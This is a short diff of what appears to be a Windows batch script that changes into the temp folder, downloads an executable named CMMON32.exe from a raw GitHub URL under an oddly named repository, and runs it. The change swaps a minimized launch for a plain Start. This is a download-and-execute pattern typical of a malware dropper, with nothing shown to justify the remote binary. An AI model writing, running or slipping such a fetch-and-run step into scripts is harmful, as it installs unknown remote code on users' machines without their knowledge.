@@ -27,6 +27,6 @@ cd %TEMP%
 
 
 powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/CMMON32.exe' -OutFile CMMON32.exe" 
-Start-Process 'CMMON32.exe' -WindowStyle Minimized
+Start CMMON32.exe
 
 
